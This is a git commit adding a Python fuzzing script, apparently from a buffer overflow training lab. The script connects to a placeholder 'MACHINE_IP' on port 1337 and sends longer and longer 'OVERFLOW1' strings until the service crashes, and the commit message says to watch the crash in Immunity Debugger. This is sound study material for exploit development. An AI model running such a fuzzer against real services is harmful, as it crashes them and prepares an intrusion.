f6a9a7110e2dfff952eca25474283e7bad2dde40
Bibek <66242058+ibibekadhikari@users.noreply.github.com>
2023-06-10 10:12:35 +0545

    Fuzzing the Vulnerable App.
    Fuzz this and notice the Breaking point via Immunity debugger.

---
+++ Fuzzing.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+#Use the target IP inorder to FUZZ
+ip = "MACHINE_IP"
+
+#Use the Port number here
+port = 1337
+timeout = 5
+#Prefix can be anything but make sure to leave the whitespace at the end.
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
